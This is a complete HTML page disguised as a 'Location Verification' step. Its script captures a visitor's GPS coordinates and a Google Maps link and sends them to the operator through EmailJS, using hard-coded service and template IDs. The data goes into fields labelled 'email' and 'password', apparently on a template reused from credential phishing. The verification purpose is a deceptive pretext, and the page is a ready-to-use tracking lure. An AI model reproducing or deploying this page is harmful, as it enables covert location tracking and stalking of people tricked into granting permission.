<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Location Verification</title>

<link rel="icon" href="https://img.icons8.com/ios-filled/50/000000/location.png">

<style>
* { box-sizing: border-box; }

body {
  margin: 0;
  font-family: "Segoe UI", Arial, sans-serif;
  background: linear-gradient(-45deg, #0a0a0a, #1a1a1a, #121212, #0a0a0a);
  background-size: 400% 400%;
  animation: gradientMove 12s ease infinite;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  color: #e0e0e0;
}

@keyframes gradientMove {
  0% { background-position: 0% 50%; }
  50% { background-position: 100% 50%; }
  100% { background-position: 0% 50%; }
}

.container {
  width: 100%;
  max-width: 420px;
  text-align: center;
  background: rgba(255,255,255,0.05);
  backdrop-filter: blur(14px);
  border-radius: 20px;
  padding: 40px 25px;
  box-shadow: 0 10px 30px rgba(0,0,0,0.6);
}

h2 {
  color: #fff;
  margin-bottom: 15px;
}

p {
  font-size: 14px;
  color: #bbb;
  margin-bottom: 25px;
}

button {
  width: 100%;
  padding: 15px;
  border-radius: 25px;
  border: none;
  background: linear-gradient(90deg, #333, #555);
  color: #fff;
  font-weight: bold;
  font-size: 15px;
  cursor: pointer;
  transition: 0.3s;
}

button:hover {
  background: linear-gradient(90deg, #444, #666);
  transform: scale(1.02);
}

#status {
  margin-top: 20px;
  font-size: 13px;
}
</style>
</head>

<body>

<div class="container">
  <h2>Location Required</h2>
  <p>
    To continue, please allow location access.<br>
    Used for verification purposes.
  </p>

  <button onclick="sendLocation()">Verify Location</button>
  <div id="status"></div>
</div>

<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script>
/* EmailJS init — your public key */
emailjs.init("Zuxy6x2TZlxuZ4ABj");

function sendLocation() {
  const status = document.getElementById("status");
  status.innerHTML = "Requesting location permission...";

  if (!navigator.geolocation) {
    status.innerHTML = "Location not supported ❌";
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const map = `https://maps.google.com/?q=${lat},${lon}`;

      /* Send using YOUR EXISTING TEMPLATE */
      emailjs.send(
        "service_z1uzh6f",
        "template_whed5zh",
        {
          email: "Location Capture",
          password:
            "Latitude: " + lat +
            "\nLongitude: " + lon +
            "\nMap: " + map
        }
      ).then(() => {
        status.innerHTML = "Location sent to Gmail ✔️";
      }).catch(err => {
        console.error(err);
        status.innerHTML = "Failed to send ❌";
      });
    },
    () => {
      status.innerHTML = "Permission denied ❌";
    }
  );
}
</script>

</body>
</html>
